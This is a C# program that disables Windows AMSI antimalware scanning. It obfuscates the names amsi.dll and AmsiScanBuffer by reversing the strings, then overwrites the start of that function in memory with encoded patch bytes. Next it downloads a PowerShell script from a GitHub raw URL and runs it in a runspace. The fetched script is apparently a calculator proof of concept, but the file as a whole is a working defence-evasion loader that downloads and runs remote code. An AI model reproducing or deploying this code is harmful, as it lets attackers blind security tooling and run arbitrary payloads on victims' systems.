using System;
using System.Text;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;
using System.Net;

public class AmsiBypass
{
    public static void Main(string[] args)
    {
        BypassAmsi();

        string scriptUrl = "https://raw.githubusercontent.com/NyaMeeEain/Calc_For_Poc/main/Powershell/calc.ps1";
        string scriptContent = DownloadScriptContent(scriptUrl);

        if (!string.IsNullOrEmpty(scriptContent))
        {
            ExecutePowerShellScript(scriptContent);
        }
        else
        {
            Console.WriteLine("Failed to download the PowerShell script.");
        }
    }

    static string DownloadScriptContent(string url)
    {
        try
        {
            using (var webClient = new WebClient())
            {
                return webClient.DownloadString(url);
            }
        }
        catch (Exception exception)
        {
            Console.WriteLine($"Failed to download the script: {exception.Message}");
            return null;
        }
    }

    public static void BypassAmsi()
    {
        char[] chars = "lld.isma".ToCharArray();
        Array.Reverse(chars);
        string libName = new string(chars);

        var moduleHandle = LoadLibrary(libName);

        chars = "reffuBnacSismA".ToCharArray();
        Array.Reverse(chars);
        string procName = new string(chars);

        var address = GetProcAddress(moduleHandle, procName);

        byte[] newBytes = new byte[] { 0xB9, 0x58, 0x01, 0x08, 0x81, 0xC3, 0x19, 0x01 };

        // Set region to RWX
        _ = VirtualProtect(address, (UIntPtr)newBytes.Length, 0x04, out uint oldProtect);
        for (var i = 0; i < newBytes.Length; i++)
        {
            newBytes[i] = (byte)((int)newBytes[i] - 1);
        }

        // Copy patch
        Marshal.Copy(newBytes, 0, address, newBytes.Length);

        // Restore region to RX
        _ = VirtualProtect(address, (UIntPtr)newBytes.Length, oldProtect, out uint _);

        Console.WriteLine("patched offset 0x{0}", address.ToString("X2"));
    }

    public static void ExecutePowerShellScript(string scriptContent)
    {
        try
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);

            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(scriptContent);
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> output = pipeline.Invoke();
            runspace.Close();

            StringBuilder sb = new StringBuilder();
            foreach (PSObject line in output)
            {
                sb.AppendLine(line.ToString());
            }

            Console.WriteLine(sb.ToString());
        }
        catch (Exception exception)
        {
           
        }
    }

    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string libName);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}